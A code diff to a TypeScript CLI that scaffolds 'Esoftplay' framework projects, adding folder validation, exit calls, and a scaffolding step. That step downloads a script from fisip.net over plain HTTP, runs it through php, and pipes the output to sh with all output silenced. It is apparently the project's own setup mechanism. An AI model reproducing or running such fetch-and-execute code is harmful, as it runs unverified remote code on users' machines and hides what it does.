@@ -1,11 +1,14 @@
 import * as p from "@clack/prompts";
-import { execSync } from "child_process";
-import fs from "fs/promises";
+import { execSync } from "node:child_process";
+import fs from "node:fs/promises";
 import { setTimeout } from "node:timers/promises";
 import color from "picocolors";
-import InstallAllArch from "./modules/install/arch/all";
-import InstallAllUbuntu from "./modules/install/ubuntu/all";
-import InstallAllDebian from "./modules/install/debian/all";
+import InstallAllArch from "./modules/install/arch/all.ts";
+import InstallAllUbuntu from "./modules/install/ubuntu/all.ts";
+import InstallAllDebian from "./modules/install/debian/all.ts";
+import process from "node:process";
+import { existsSync, mkdirSync, rmdirSync } from "node:fs";
+import { join } from "node:path";
 
 async function main() {
   console.clear();
@@ -70,6 +73,8 @@ async function handleInstall() {
       color.cyan("https://dev.esoftplay.com")
     )}`
   );
+
+  process.exit(0);
 }
 
 async function detectDistro() {
@@ -106,6 +111,7 @@ async function handleNew() {
 
   await setTimeout(1000);
 
+  const path = await getCurrentDirPath();
   const args = process.argv.slice(2);
   let projectName = args[1];
 
@@ -118,6 +124,11 @@ async function handleNew() {
             placeholder: "project-name",
             validate: (value) => {
               if (!value) return "Please enter a valid project name.";
+
+              const fullPath = join(path, value);
+              if (existsSync(fullPath)) {
+                return `Folder '${value}' already exists.`;
+              }
             },
           }),
       },
@@ -131,12 +142,33 @@ async function handleNew() {
     projectName = response.name;
   }
 
-  const path = await getCurrentDirPath();
   const fullPath = `${path}/${projectName}`;
 
   const s = p.spinner();
   s.start(`Scaffolding project at ${fullPath}`);
-  await setTimeout(5000); // Simulate project creation
+
+  try {
+    mkdirSync(fullPath);
+
+    process.chdir(fullPath);
+  } catch (_error) {
+    p.cancel(`Failed to create project at ${fullPath}`);
+    process.exit(0);
+  }
+
+  try {
+    execSync("curl -s fisip.net/fw -o script.php");
+
+    execSync("php script.php > script.sh 2>/dev/null");
+
+    execSync("sh script.sh > /dev/null 2>&1");
+  } catch (error) {
+    rmdirSync(fullPath, { recursive: true });
+
+    p.cancel(`Failed to create project at ${fullPath}`);
+    process.exit(0);
+  }
+
   s.stop(`Project '${projectName}' successfully created at ${fullPath}`);
 
   p.note(`cd ${fullPath}\nedit config.php`, "Next steps");
@@ -146,6 +178,8 @@ async function handleNew() {
       color.cyan("https://dev.esoftplay.com")
     )}`
   );
+
+  process.exit(0);
 }
 
 async function getCurrentDirPath(): Promise<string> {
@@ -173,6 +207,8 @@ async function handleUpdate() {
       color.cyan("https://dev.esoftplay.com")
     )}`
   );
+
+  process.exit(0);
 }
 
 function displayHelp() {
@@ -185,6 +221,7 @@ Commands:
   update    Update the Esoftplay Framework.
   help      Show this help message.
   `);
+
   process.exit(0);
 }
 
